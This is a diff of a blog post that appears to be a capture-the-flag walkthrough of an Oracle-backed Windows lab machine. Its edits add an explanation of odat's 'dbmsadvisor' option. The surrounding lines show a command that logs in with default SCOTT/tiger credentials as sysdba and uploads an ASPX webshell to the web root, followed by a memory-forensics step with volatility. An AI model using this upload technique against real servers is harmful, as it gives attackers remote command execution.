@@ -138,11 +138,12 @@ Connected to:
 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 
 SQL> 
-*{% endhighlight %}
+{% endhighlight %}
 
 For the Oracle penetration testing, we can use a script "<a href="https://github.com/quentinhardy/odat">odat.py</a>".<br>
 It is not installed by default, we have to install with "apt-get"<br>
-Then, upload a aspx webshell which is installed on Kali linux by default.
+Then, upload a aspx webshell which is installed on Kali linux by default.<br>
+To upload a file, we need an option "dbmsadvisor".
 {% highlight shell %}
 root@kali:~# odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx 
 
@@ -270,7 +271,7 @@ KPCR                          : 0xffffd000207e8000 (CPU 1)
 {% endhighlight %}
 
 We figured out the OS is "Windows server 2012 64bit".<br>
-Then, see the content of memory dump.
+Then, take a look at the registory hive.
 {% highlight shell %}
 root@kali:~# volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hivelist
 Volatility Foundation Volatility Framework 2.6
